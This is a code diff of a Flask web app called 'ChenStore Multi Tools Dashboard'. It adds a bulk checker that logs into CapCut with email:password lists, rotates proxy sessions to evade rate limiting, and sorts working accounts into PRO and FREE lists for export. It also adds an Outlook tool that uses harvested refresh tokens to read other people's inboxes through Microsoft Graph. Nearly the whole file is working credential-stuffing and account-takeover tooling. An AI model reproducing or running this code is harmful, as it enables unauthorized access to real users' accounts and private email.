@@ -1,18 +1,405 @@
 """ChenStore Multi Tools Dashboard: CapCut & Outlook Webmail Reader.
-Theme: ChenStore Pirate / Wood & Gold Luxury Dark Aesthetic.
+Self-contained single file for Vercel Serverless Function deployment.
 """
 import json
 import os
 import re
+import random
+import string
+import datetime
+from datetime import timezone
+from typing import Dict, Any, Tuple, Optional, List
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from flask import Flask, Response, render_template_string, request, jsonify, send_from_directory
-
-import capcut_check
-import capcut_cli
-import outlook_check
+import requests
 
 app = Flask(__name__)
 
+# ==================== CAPCUT CORE LOGIC ====================
+CAPCUT_AID = "348188"
+LOGIN_HOST = "login-row.www.capcut.com"
+SUB_URL = "https://commerce-api-sg.capcut.com/commerce/v3/trade/subscription_infos"
+UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
+_WEB_HDR = {"Referer": "https://www.capcut.com/", "Origin": "https://www.capcut.com"}
+
+def _enc(s):
+    return "".join("%02x" % (ord(c) ^ 5) for c in str(s))
+
+def _sess_id(n=18):
+    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))
+
+def _proxies(template, sid):
+    if not template:
+        return None
+    url = template.replace("{sess}", sid)
+    return {"http": url, "https": url}
+
+def _logout(s, timeout=15):
+    try:
+        csrf = s.cookies.get("passport_csrf_token", "")
+        s.post("https://%s/passport/user/logout/?aid=%s&account_sdk_source=web" % (LOGIN_HOST, CAPCUT_AID),
+               headers={**_WEB_HDR, "x-tt-passport-csrf-token": csrf}, timeout=timeout)
+    except Exception:
+        pass
+
+def check_capcut_account(email, password, proxy_template=None, max_ip_retries=6, timeout=30):
+    email = (email or "").strip()
+    password = (password or "").strip()
+    out = {"ok": False, "email": email, "user_id": "", "plan": "", "expiry": "",
+           "is_pro": False, "error": ""}
+    if not email or not password:
+        out["error"] = "missing email/password"
+        return out
+    last_err = "login failed"
+    for _ in range(max(1, int(max_ip_retries or 1))):
+        sid = _sess_id()
+        s = requests.Session()
+        prox = _proxies(proxy_template, sid)
+        if prox:
+            s.proxies = prox
+        s.headers.update({"User-Agent": UA})
+        try:
+            url = ("https://%s/passport/web/email/login/?aid=%s&account_sdk_source=web"
+                   "&language=en&verifyFp=verify_%s&device_platform=web"
+                   % (LOGIN_HOST, CAPCUT_AID, sid))
+            data = {"mix_mode": "1", "email": _enc(email), "password": _enc(password),
+                    "fixed_mix_mode": "1"}
+            hdr = dict(_WEB_HDR); hdr["Content-Type"] = "application/x-www-form-urlencoded"
+            r = s.post(url, data=data, headers=hdr, timeout=timeout)
+            try:
+                j = r.json()
+            except Exception:
+                last_err = "login: unreadable response"
+                continue
+            dd = j.get("data") or {}
+            if "sessionid" not in s.cookies.get_dict():
+                ec = dd.get("error_code")
+                if ec == 7:
+                    last_err = "IP rate-limited"
+                    continue
+                if dd.get("captcha"):
+                    out["error"] = "captcha required"
+                    return out
+                out["error"] = "login failed: %s" % (dd.get("description")
+                                                     or j.get("message") or "invalid credentials")
+                return out
+            out["user_id"] = dd.get("user_id_str") or (str(dd.get("user_id")) if dd.get("user_id") else "")
+            body = {"scene": ["vip", "workspace"], "vip_levels": ["vip"], "app_id": int(CAPCUT_AID)}
+            hdr2 = dict(_WEB_HDR); hdr2["Content-Type"] = "application/json"
+            sr = s.post(SUB_URL, json=body, headers=hdr2, timeout=timeout)
+            sj = sr.json()
+            vip = ((((sj.get("data") or {}).get("subscription_user_infos") or {})
+                    .get("vip") or {}).get("vip_infos")) or []
+            if vip and vip[0].get("is_vip"):
+                info = vip[0]
+                out["is_pro"] = True
+                out["plan"] = "Pro (%s)" % (info.get("vip_level") or "vip")
+                end = info.get("vip_end_time")
+                try:
+                    end = int(end)
+                except (TypeError, ValueError):
+                    end = 0
+                out["expiry"] = (datetime.datetime.fromtimestamp(end, datetime.timezone.utc)
+                                 .strftime("%Y-%m-%d")) if end > 0 else "lifetime"
+            else:
+                out["plan"] = "Free"
+                out["expiry"] = "-"
+            _logout(s)
+            out["ok"] = True
+            return out
+        except Exception:
+            last_err = "network/proxy error"
+            continue
+    out["error"] = last_err
+    return out
+
+_CC_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
+def parse_capcut_accounts(text: str) -> list:
+    out = []
+    seen = set()
+    for line in text.splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        m = _CC_EMAIL_RE.search(line)
+        if not m:
+            continue
+        email = m.group(0).lower()
+        tail = line[m.end():].lstrip(" \t:,|=-")
+        if not tail:
+            continue
+        pw = re.split(r"[\s,:|]+", tail)[0]
+        if not pw:
+            continue
+        key = (email, pw)
+        if key in seen:
+            continue
+        seen.add(key)
+        out.append(key)
+    return out
+
+# ==================== OUTLOOK CORE LOGIC ====================
+DEFAULT_CLIENT_ID = "9e5f94bc-e8a4-4e73-b8be-63364c29d753"
+INBOX_MESSAGES_URL = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages"
+SINGLE_MESSAGE_URL = "https://graph.microsoft.com/v1.0/me/messages"
+TOKEN_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
+
+ERROR_MESSAGES = {
+    "AADSTS70000": "Token tidak valid, kedaluwarsa, atau rusak.",
+    "AADSTS700016": "Client ID tidak ditemukan di Azure AD.",
+    "AADSTS700038": "Client ID tidak valid.",
+    "AADSTS90023": "Aplikasi tidak memiliki izin untuk mengakses resource ini.",
+    "AADSTS50173": "Sesi token kedaluwarsa. Perlu generate token baru.",
+    "AADSTS900232": "Aplikasi tidak diizinkan untuk tipe akun ini.",
+}
+
+_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
+_CLIENT_ID_RE = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")
+
+def parse_outlook_lines(text: str) -> List[Dict[str, str]]:
+    results = []
+    seen = set()
+    for line in text.splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        if "|" in line:
+            parts = [p.strip() for p in line.split("|") if p.strip()]
+        elif "----" in line:
+            parts = [p.strip() for p in line.split("----") if p.strip()]
+        elif "\t" in line:
+            parts = [p.strip() for p in line.split("\t") if p.strip()]
+        else:
+            parts = [p.strip() for p in re.split(r"[:;\s]+", line) if p.strip()]
+
+        if not parts:
+            continue
+        email = ""
+        password = ""
+        token = ""
+        client_id = DEFAULT_CLIENT_ID
+        email_match = _EMAIL_RE.search(line)
+        if email_match:
+            email = email_match.group(0).strip()
+        for p in parts:
+            if _CLIENT_ID_RE.match(p):
+                client_id = p
+                break
+        for p in parts:
+            if p.startswith("M.") or (len(p) > 50 and p != email and p != client_id):
+                token = p
+                break
+        if not token:
+            if len(parts) >= 3 and parts[0] == email:
+                token = parts[2] if len(parts) >= 4 else parts[1]
+                password = parts[1] if len(parts) >= 4 else ""
+            elif len(parts) == 1 and (parts[0].startswith("M.") or len(parts[0]) > 40):
+                token = parts[0]
+        if not token:
+            continue
+        if not password and len(parts) >= 2 and parts[0] == email and parts[1] != token:
+            password = parts[1]
+        key = f"{email}_{token[:20]}"
+        if key in seen:
+            continue
+        seen.add(key)
+        results.append({
+            "email": email or "Unknown Email",
+            "password": password,
+            "refresh_token": token,
+            "client_id": client_id
+        })
+    return results
+
+def get_access_token(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None) -> Tuple[Optional[str], Optional[str]]:
+    client_id = client_id or DEFAULT_CLIENT_ID
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    data = {
+        "grant_type": "refresh_token",
+        "client_id": client_id,
+        "refresh_token": refresh_token,
+        "scope": "https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/User.Read"
+    }
+    try:
+        r = requests.post(TOKEN_URL, data=data, proxies=proxies, timeout=10)
+        res_json = r.json()
+    except Exception as e:
+        return None, f"Network / Proxy error: {str(e)}"
+
+    if r.status_code != 200:
+        err_desc = res_json.get("error_description") or res_json.get("error") or r.text[:120]
+        for code, msg in ERROR_MESSAGES.items():
+            if code in err_desc:
+                err_desc = f"[{code}] {msg}"
+                break
+        return None, err_desc
+
+    access_token = res_json.get("access_token")
+    if not access_token:
+        return None, "Access token tidak ditemukan dalam respon"
+    return access_token, None
+
+def check_outlook_account(email: str, password: str, refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None) -> Dict[str, Any]:
+    out = {
+        "ok": False,
+        "email": email,
+        "password": password,
+        "client_id": client_id or DEFAULT_CLIENT_ID,
+        "refresh_token": refresh_token,
+        "status": "DEAD",
+        "unread_count": 0,
+        "latest_subject": "",
+        "latest_from": "",
+        "latest_date": "",
+        "error": ""
+    }
+    access_token, err = get_access_token(refresh_token, client_id, proxy)
+    if not access_token:
+        out["error"] = err
+        return out
+
+    headers = {"Authorization": f"Bearer {access_token}"}
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+
+    try:
+        if not email or email == "Unknown Email":
+            me_res = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers, proxies=proxies, timeout=10)
+            if me_res.status_code == 200:
+                me_data = me_res.json()
+                out["email"] = me_data.get("mail") or me_data.get("userPrincipalName") or email
+
+        params = {
+            "$orderby": "receivedDateTime desc",
+            "$top": "1",
+            "$select": "id,subject,from,receivedDateTime,isRead"
+        }
+        inbox_res = requests.get(INBOX_MESSAGES_URL, headers=headers, params=params, proxies=proxies, timeout=10)
+        if inbox_res.status_code == 200:
+            inbox_data = inbox_res.json().get("value", [])
+            if inbox_data:
+                latest = inbox_data[0]
+                out["latest_subject"] = latest.get("subject") or "(Tanpa Subjek)"
+                sender = latest.get("from", {}).get("emailAddress", {})
+                out["latest_from"] = sender.get("name") or sender.get("address") or "Unknown"
+                out["latest_date"] = (latest.get("receivedDateTime") or "")[:10]
+    except Exception:
+        pass
+
+    out["ok"] = True
+    out["status"] = "LIVE"
+    return out
+
+def fetch_inbox_messages(refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None, top: int = 30) -> Dict[str, Any]:
+    access_token, err = get_access_token(refresh_token, client_id, proxy)
+    if not access_token:
+        return {"ok": False, "error": err, "messages": []}
+
+    headers = {"Authorization": f"Bearer {access_token}"}
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    params = {
+        "$orderby": "receivedDateTime desc",
+        "$top": str(max(1, min(100, top))),
+        "$select": "id,subject,from,receivedDateTime,bodyPreview,isRead"
+    }
+
+    try:
+        r = requests.get(INBOX_MESSAGES_URL, headers=headers, params=params, proxies=proxies, timeout=10)
+        if r.status_code != 200:
+            return {"ok": False, "error": f"HTTP {r.status_code}: {r.text[:120]}", "messages": []}
+
+        data = r.json()
+        raw_items = data.get("value", [])
+        messages = []
+        for item in raw_items:
+            sender_obj = item.get("from", {}).get("emailAddress", {})
+            sender_name = sender_obj.get("name") or sender_obj.get("address") or "Unknown"
+            sender_addr = sender_obj.get("address") or ""
+
+            raw_dt = item.get("receivedDateTime", "")
+            time_display = raw_dt[:10]
+            try:
+                dt = datetime.datetime.fromisoformat(raw_dt.replace("Z", "+00:00"))
+                now = datetime.datetime.now(timezone.utc)
+                diff = now - dt
+                if diff.total_seconds() < 3600:
+                    mins = max(1, int(diff.total_seconds() // 60))
+                    time_display = f"{mins}m ago"
+                elif diff.total_seconds() < 86400:
+                    hrs = int(diff.total_seconds() // 3600)
+                    time_display = f"{hrs}h ago"
+                elif diff.days == 1:
+                    time_display = "Yesterday"
+                elif diff.days < 7:
+                    time_display = f"{diff.days}d ago"
+                else:
+                    time_display = dt.strftime("%d %b %Y")
+            except Exception:
+                pass
+
+            messages.append({
+                "id": item.get("id"),
+                "subject": item.get("subject") or "(Tanpa Subjek)",
+                "sender_name": sender_name,
+                "sender_email": sender_addr,
+                "preview": item.get("bodyPreview") or "",
+                "time_display": time_display,
+                "raw_date": raw_dt,
+                "is_read": item.get("isRead", True)
+            })
+
+        return {"ok": True, "messages": messages}
+    except Exception as e:
+        return {"ok": False, "error": str(e), "messages": []}
+
+def fetch_message_detail(message_id: str, refresh_token: str, client_id: str = DEFAULT_CLIENT_ID, proxy: Optional[str] = None) -> Dict[str, Any]:
+    access_token, err = get_access_token(refresh_token, client_id, proxy)
+    if not access_token:
+        return {"ok": False, "error": err}
+
+    headers = {"Authorization": f"Bearer {access_token}"}
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    url = f"{SINGLE_MESSAGE_URL}/{message_id}"
+    params = {"$select": "id,subject,from,toRecipients,receivedDateTime,body"}
+
+    try:
+        r = requests.get(url, headers=headers, params=params, proxies=proxies, timeout=25)
+        if r.status_code != 200:
+            return {"ok": False, "error": f"HTTP {r.status_code}: {r.text[:120]}"}
+
+        data = r.json()
+        sender_obj = data.get("from", {}).get("emailAddress", {})
+        sender_str = f"{sender_obj.get('name', '')} <{sender_obj.get('address', '')}>" if sender_obj.get('name') else sender_obj.get('address', 'Unknown')
+
+        to_recipients = data.get("toRecipients", [])
+        to_str = ", ".join([t.get("emailAddress", {}).get("address", "") for t in to_recipients if t.get("emailAddress")])
+
+        body_obj = data.get("body", {})
+        body_content = body_obj.get("content", "")
+        body_type = body_obj.get("contentType", "text")
+
+        raw_dt = data.get("receivedDateTime", "")
+        formatted_date = raw_dt
+        try:
+            dt = datetime.datetime.fromisoformat(raw_dt.replace("Z", "+00:00"))
+            formatted_date = dt.strftime("%d %b %Y, %H:%M")
+        except Exception:
+            pass
+
+        return {
+            "ok": True,
+            "id": data.get("id"),
+            "subject": data.get("subject") or "(Tanpa Subjek)",
+            "from": sender_str,
+            "to": to_str,
+            "date": formatted_date,
+            "body": body_content,
+            "body_type": body_type
+        }
+    except Exception as e:
+        return {"ok": False, "error": str(e)}
+
+# ==================== HTML TEMPLATE ====================
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -54,7 +441,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       overflow: hidden;
     }
 
-    /* Top Navbar */
     .top-navbar {
       background-color: #140d07;
       border-bottom: 2px solid #382415;
@@ -112,7 +498,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       box-shadow: 0 2px 12px var(--gold-glow);
     }
 
-    /* Content Area */
     .main-tab-content {
       flex: 1;
       overflow: hidden;
@@ -128,7 +513,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       display: flex;
     }
 
-    /* TrackMail 3-Column Layout */
     .trackmail-container {
       display: flex;
       width: 100%;
@@ -136,7 +520,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       overflow: hidden;
     }
 
-    /* Col 1: Accounts Sidebar */
     .tm-sidebar {
       width: 290px;
       background-color: #120c08;
@@ -202,7 +585,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     .status-dot.live { background-color: var(--dot-green); box-shadow: 0 0 8px rgba(34, 197, 94, 0.7); }
     .status-dot.dead { background-color: var(--dot-red); box-shadow: 0 0 8px rgba(239, 68, 68, 0.7); }
 
-    /* Col 2: Message List */
     .tm-messages-col {
       width: 360px;
       background-color: #140d08;
@@ -252,7 +634,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       box-shadow: 0 0 6px rgba(245, 158, 11, 0.8);
     }
 
-    /* Col 3: Email Reader */
     .tm-reader-col {
       flex: 1;
       background-color: #0f0a06;
@@ -291,7 +672,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       flex: 1;
     }
 
-    /* CapCut Tab Styles */
     .capcut-container {
       width: 100%;
       height: 100%;
@@ -339,7 +719,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 </head>
 <body>
 
-  <!-- Top Navbar -->
   <div class="top-navbar">
     <div class="d-flex align-items-center gap-3">
       <img src="/logo.png" alt="ChenStore" style="height: 46px; border-radius: 8px; border: 1px solid #78471c; box-shadow: 0 2px 8px rgba(0,0,0,0.5);" onerror="this.style.display='none'">
@@ -363,14 +742,11 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     </ul>
   </div>
 
-  <!-- Main Content Areas -->
   <div class="main-tab-content">
     
-    <!-- ==================== TAB 1: MAIL CHECKER 3-COLUMN ==================== -->
     <div id="tab-mail" class="tab-pane-custom active">
       <div class="trackmail-container">
         
-        <!-- COLUMN 1: Accounts Sidebar -->
         <div class="tm-sidebar">
           <div class="tm-sidebar-header">
             <span class="small fw-bold text-uppercase text-warning" style="letter-spacing: 0.5px;">
@@ -396,7 +772,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           </div>
         </div>
 
-        <!-- COLUMN 2: Message List -->
         <div class="tm-messages-col">
           <div class="tm-messages-header">
             <span class="fw-bold small text-uppercase text-warning" id="tmInboxTitle">
@@ -413,7 +788,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           </div>
         </div>
 
-        <!-- COLUMN 3: Email Reader -->
         <div class="tm-reader-col">
           <div class="tm-reader-topbar">
             <div class="d-flex align-items-center gap-3">
@@ -444,12 +818,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       </div>
     </div>
 
-    <!-- ==================== TAB 2: CAPCUT CHECKER ==================== -->
     <div id="tab-capcut" class="tab-pane-custom">
       <div class="capcut-container">
         <div class="row g-4">
           
-          <!-- CapCut Input -->
           <div class="col-lg-5">
             <div class="card card-theme p-4 shadow-sm">
               <h5 class="fw-bold mb-3 text-warning"><i class="fa-solid fa-film me-2"></i>Input Akun CapCut</h5>
@@ -489,7 +861,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 </button>
               </div>
 
-              <!-- Progress bar -->
               <div class="mt-4">
                 <div class="d-flex justify-content-between small text-secondary mb-1">
                   <span>Progress</span>
@@ -502,7 +873,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             </div>
           </div>
 
-          <!-- CapCut Output -->
           <div class="col-lg-7">
             <div class="card card-theme p-4 shadow-sm">
               <div class="d-flex justify-content-between align-items-center mb-3">
@@ -517,7 +887,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 </div>
               </div>
 
-              <!-- PRO Result Box -->
               <div class="mb-3">
                 <div class="d-flex justify-content-between align-items-center mb-1">
                   <span class="fw-bold text-success">
@@ -532,7 +901,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 <textarea id="proResult" class="form-control form-control-theme border-success" rows="4" readonly placeholder="Akun PRO akan muncul di sini..."></textarea>
               </div>
 
-              <!-- FREE Result Box -->
               <div class="mb-3">
                 <div class="d-flex justify-content-between align-items-center mb-1">
                   <span class="fw-bold text-info">
@@ -547,7 +915,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 <textarea id="freeResult" class="form-control form-control-theme border-info" rows="4" readonly placeholder="Akun FREE akan muncul di sini..."></textarea>
               </div>
 
-              <!-- DIE Result Box -->
               <div>
                 <div class="d-flex justify-content-between align-items-center mb-1">
                   <span class="fw-bold text-danger">
@@ -571,7 +938,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 
   </div>
 
-  <!-- Modal Add Account -->
   <div class="modal fade" id="addAccountModal" tabindex="-1" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered">
       <div class="modal-content card-theme border-warning text-light">
@@ -600,7 +966,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
   <script>
-    /* =================== TAB SWITCHING =================== */
     function switchTab(tabName) {
       document.querySelectorAll('.nav-tabs-custom .nav-link').forEach(btn => btn.classList.remove('active'));
       document.querySelectorAll('.tab-pane-custom').forEach(pane => pane.classList.remove('active'));
@@ -634,7 +999,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       link.click();
     }
 
-    /* =================== HELPER & CLIENT-SIDE PARSERS =================== */
     async function safeFetchJson(url, options = {}) {
       const res = await fetch(url, options);
       const text = await res.text();
@@ -683,24 +1047,30 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           }
         }
 
-        for (const p of parts) {
-          if (p !== email && p !== clientId && p !== token && p.length < 50) {
-            password = p;
-            break;
+        if (!token) {
+          if (parts.length >= 3 && parts[0] === email) {
+            token = parts.length >= 4 ? parts[2] : parts[1];
+            password = parts.length >= 4 ? parts[1] : '';
+          } else if (parts.length === 1 && (parts[0].startsWith('M.') || parts[0].length > 40)) {
+            token = parts[0];
           }
         }
 
-        if (token) {
-          const key = (email || token.slice(0, 30)) + '_' + token.slice(-20);
-          if (!seen.has(key)) {
-            seen.add(key);
-            results.push({
-              email: email || 'Unknown',
-              password: password,
-              refresh_token: token,
-              client_id: clientId
-            });
-          }
+        if (!token) continue;
+
+        if (!password && parts.length >= 2 && parts[0] === email && parts[1] !== token) {
+          password = parts[1];
+        }
+
+        const key = (email || token.slice(0, 30)) + '_' + token.slice(-20);
+        if (!seen.has(key)) {
+          seen.add(key);
+          results.push({
+            email: email || 'Unknown',
+            password: password,
+            refresh_token: token,
+            client_id: clientId
+          });
         }
       }
       return results;
@@ -751,7 +1121,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       return accounts;
     }
 
-    /* =================== MAIL SYSTEM =================== */
     let outlookAccounts = [];
     let selectedAccountIndex = -1;
 
@@ -793,16 +1162,25 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       const proxy = proxyEl ? proxyEl.value.trim() : '';
       if (!text) return alert('Silakan masukkan token / akun!');
 
-      const modalEl = document.getElementById('addAccountModal');
-      if (modalEl) {
-        try {
+      // Force close modal
+      try {
+        const modalEl = document.getElementById('addAccountModal');
+        if (modalEl) {
           const closeBtn = modalEl.querySelector('[data-bs-dismiss="modal"]');
           if (closeBtn) closeBtn.click();
-          else if (window.bootstrap && bootstrap.Modal) {
-            const modal = bootstrap.Modal.getInstance(modalEl) || new bootstrap.Modal(modalEl);
-            if (modal) modal.hide();
+          if (window.bootstrap && bootstrap.Modal) {
+            const inst = bootstrap.Modal.getInstance(modalEl);
+            if (inst) inst.hide();
           }
-        } catch(e) {}
+          modalEl.classList.remove('show');
+          modalEl.style.display = 'none';
+          document.querySelectorAll('.modal-backdrop').forEach(b => b.remove());
+          document.body.classList.remove('modal-open');
+          document.body.style.removeProperty('padding-right');
+          document.body.style.removeProperty('overflow');
+        }
+      } catch(e) {
+        console.error('Modal close error:', e);
       }
 
       const container = document.getElementById('tmAccountsContainer');
@@ -817,11 +1195,13 @@ HTML_TEMPLATE = """<!DOCTYPE html>
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ text: text, mode: 'outlook' })
             });
-          } catch(e) {}
+          } catch(e) {
+            console.error('API parse error:', e);
+          }
         }
         if (!items || items.length === 0) {
           renderAccountsList();
-          return alert('Format tidak dikenali / tidak ada token valid!');
+          return alert('Format tidak dikenali / token tidak ditemukan! Pastikan ada email dan refresh token.');
         }
 
         let currentIndex = 0;
@@ -1026,21 +1406,22 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       }
     }
 
-    /* =================== CAPCUT CHECKER =================== */
     let capcutRecords = [];
     let capcutAbortController = null;
 
     const ccAccountsInput = document.getElementById('ccAccountsInput');
     const ccLineCount = document.getElementById('ccLineCount');
 
-    ccAccountsInput.addEventListener('input', () => {
-      const lines = ccAccountsInput.value.split('\n').filter(l => l.trim().length > 0);
-      ccLineCount.textContent = lines.length + ' Baris';
-    });
+    if (ccAccountsInput) {
+      ccAccountsInput.addEventListener('input', () => {
+        const lines = ccAccountsInput.value.split('\\n').filter(l => l.trim().length > 0);
+        if (ccLineCount) ccLineCount.textContent = lines.length + ' Baris';
+      });
+    }
 
     function clearCapcutInput() {
       ccAccountsInput.value = '';
-      ccLineCount.textContent = '0 Baris';
+      if (ccLineCount) ccLineCount.textContent = '0 Baris';
     }
 
     function clearCapcutResults() {
@@ -1073,14 +1454,14 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           r.expiry || '',
           r.error || ''
         ].map(val => `"${(val || '').toString().replace(/"/g, '""')}"`).join(','));
-        content = [headers.join(','), ...rows].join('\r\n');
+        content = [headers.join(','), ...rows].join('\\r\\n');
         filename = 'capcut_results.csv';
         mimeType = 'text/csv;charset=utf-8;';
       } else {
         const pro = document.getElementById('proResult').value.trim();
         const free = document.getElementById('freeResult').value.trim();
         const die = document.getElementById('dieResult').value.trim();
-        content = `=== PRO ACCOUNTS ===\n${pro}\n\n=== FREE ACCOUNTS ===\n${free}\n\n=== DEAD ACCOUNTS ===\n${die}\n`;
+        content = `=== PRO ACCOUNTS ===\\n${pro}\\n\\n=== FREE ACCOUNTS ===\\n${free}\\n\\n=== DEAD ACCOUNTS ===\\n${die}\\n`;
         filename = 'capcut_results.txt';
         mimeType = 'text/plain;charset=utf-8;';
       }
@@ -1162,16 +1543,16 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 countPro++;
                 document.getElementById('proCount').textContent = countPro;
                 const exp = r.expiry ? ` | Exp: ${r.expiry}` : '';
-                document.getElementById('proResult').value += `${r.email}:${r.password}${uidStr}${exp}\n`;
+                document.getElementById('proResult').value += `${r.email}:${r.password}${uidStr}${exp}\\n`;
               } else if (r.ok && !r.is_pro) {
                 countFree++;
                 document.getElementById('freeCount').textContent = countFree;
-                document.getElementById('freeResult').value += `${r.email}:${r.password}${uidStr} | Free Plan\n`;
+                document.getElementById('freeResult').value += `${r.email}:${r.password}${uidStr} | Free Plan\\n`;
               } else {
                 countDie++;
                 document.getElementById('dieCount').textContent = countDie;
                 const err = r.error ? ` [${r.error}]` : '';
-                document.getElementById('dieResult').value += `${r.email}:${r.password}${err}\n`;
+                document.getElementById('dieResult').value += `${r.email}:${r.password}${err}\\n`;
               }
 
               const percent = Math.round((checked / total) * 100);
@@ -1182,7 +1563,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
               checked++;
               countDie++;
               document.getElementById('dieCount').textContent = countDie;
-              document.getElementById('dieResult').value += `${acc.email}:${acc.password} [${e.message}]\n`;
+              document.getElementById('dieResult').value += `${acc.email}:${acc.password} [${e.message}]\\n`;
               const percent = Math.round((checked / total) * 100);
               document.getElementById('ccProgressText').textContent = `${checked} / ${total} (${percent}%)`;
               document.getElementById('ccProgressBar').style.width = `${percent}%`;
@@ -1214,6 +1595,8 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 </html>
 """
 
+# ==================== FLASK ROUTES ====================
+
 @app.route("/")
 @app.route("/api/index.py")
 @app.route("/api/index")
@@ -1224,9 +1607,12 @@ def index():
 
 @app.route("/logo.png")
 def serve_logo():
-    return send_from_directory(os.path.dirname(os.path.abspath(__file__)), "logo.png")
+    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    logo_path = os.path.join(base_dir, "logo.png")
+    if os.path.exists(logo_path):
+        return send_from_directory(base_dir, "logo.png")
+    return ("", 204)
 
-# CapCut Check API
 @app.route("/api/check", methods=["POST"])
 def api_check_capcut():
     payload = request.get_json(force=True)
@@ -1235,7 +1621,7 @@ def api_check_capcut():
     workers = int(payload.get("workers", 6))
     retries = int(payload.get("retries", 6))
 
-    accounts = capcut_cli.parse_accounts(accounts_text)
+    accounts = parse_capcut_accounts(accounts_text)
     total = len(accounts)
 
     def generate():
@@ -1245,7 +1631,7 @@ def api_check_capcut():
 
         def _do_check(item):
             email, pw = item
-            res = capcut_check.check_capcut_account(
+            res = check_capcut_account(
                 email, pw, proxy_template=proxy_url, max_ip_retries=retries
             )
             res["password"] = pw
@@ -1263,8 +1649,6 @@ def api_check_capcut():
 
     return Response(generate(), mimetype="application/x-ndjson")
 
-
-# Outlook / Hotmail Check & Stream API
 @app.route("/api/check_outlook", methods=["POST"])
 def api_check_outlook():
     payload = request.get_json(force=True)
@@ -1272,7 +1656,7 @@ def api_check_outlook():
     proxy_url = payload.get("proxy", "").strip() or None
     workers = int(payload.get("workers", 8))
 
-    items = outlook_check.parse_outlook_lines(accounts_text)
+    items = parse_outlook_lines(accounts_text)
     total = len(items)
 
     def generate():
@@ -1281,7 +1665,7 @@ def api_check_outlook():
             return
 
         def _do_check_outlook(item):
-            res = outlook_check.check_outlook_account(
+            res = check_outlook_account(
                 email=item["email"],
                 password=item["password"],
                 refresh_token=item["refresh_token"],
@@ -1301,8 +1685,6 @@ def api_check_outlook():
 
     return Response(generate(), mimetype="application/x-ndjson")
 
-
-# CapCut Check Single Account API (Fast, Zero-Timeout for Vercel & Cloud)
 @app.route("/check_single_capcut", methods=["POST"])
 @app.route("/api/check_single_capcut", methods=["POST"])
 def api_check_single_capcut():
@@ -1312,13 +1694,11 @@ def api_check_single_capcut():
     proxy_url = payload.get("proxy", "").strip() or os.environ.get("CAPCUT_PROXY", "")
     retries = int(payload.get("retries", 6))
 
-    res = capcut_check.check_capcut_account(email, pw, proxy_template=proxy_url, max_ip_retries=retries)
+    res = check_capcut_account(email, pw, proxy_template=proxy_url, max_ip_retries=retries)
     res["password"] = pw
     res["status"] = "PRO" if (res.get("ok") and res.get("is_pro")) else ("FREE" if res.get("ok") else "DEAD")
     return jsonify(res)
 
-
-# Parse Accounts Helper API
 @app.route("/parse_accounts", methods=["POST"])
 @app.route("/api/parse_accounts", methods=["POST"])
 def api_parse_accounts():
@@ -1327,14 +1707,12 @@ def api_parse_accounts():
     mode = payload.get("mode", "capcut")
 
     if mode == "capcut":
-        accounts = capcut_cli.parse_accounts(text)
+        accounts = parse_capcut_accounts(text)
         return jsonify([{"email": a[0], "password": a[1]} for a in accounts])
     else:
-        items = outlook_check.parse_outlook_lines(text)
+        items = parse_outlook_lines(text)
         return jsonify(items)
 
-
-# Outlook Check Single Account API
